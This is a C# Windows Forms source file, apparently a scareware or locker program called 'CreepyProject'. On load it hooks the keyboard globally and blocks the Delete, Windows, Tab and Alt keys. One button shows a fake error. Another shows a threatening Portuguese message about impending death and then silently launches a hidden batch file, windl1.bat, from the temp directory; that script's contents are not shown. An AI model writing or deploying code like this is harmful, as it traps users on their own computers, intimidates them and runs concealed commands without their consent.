using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Utilities;
using System.Diagnostics;



namespace CreepyProject
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("ERROR 666 0x666666");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            globalKeyboardHook gkh = new globalKeyboardHook();
            gkh.HookedKeys.Add(Keys.Delete);
            gkh.HookedKeys.Add(Keys.RWin);
            gkh.HookedKeys.Add(Keys.LWin);
            gkh.HookedKeys.Add(Keys.Tab);
            gkh.HookedKeys.Add(Keys.Alt);



            gkh.KeyDown += new KeyEventHandler(handleKey);
        }

        private void handleKey(object sender, KeyEventArgs e)
        {

            e.Handled = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("A morte virá em instantes. Boa sorte.");
            string temp = System.IO.Path.GetTempPath();

            ProcessStartInfo psi1 = new ProcessStartInfo(temp + "windl1.bat");
            psi1.CreateNoWindow = true;
            psi1.UseShellExecute = false;
            Process.Start(psi1);


        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
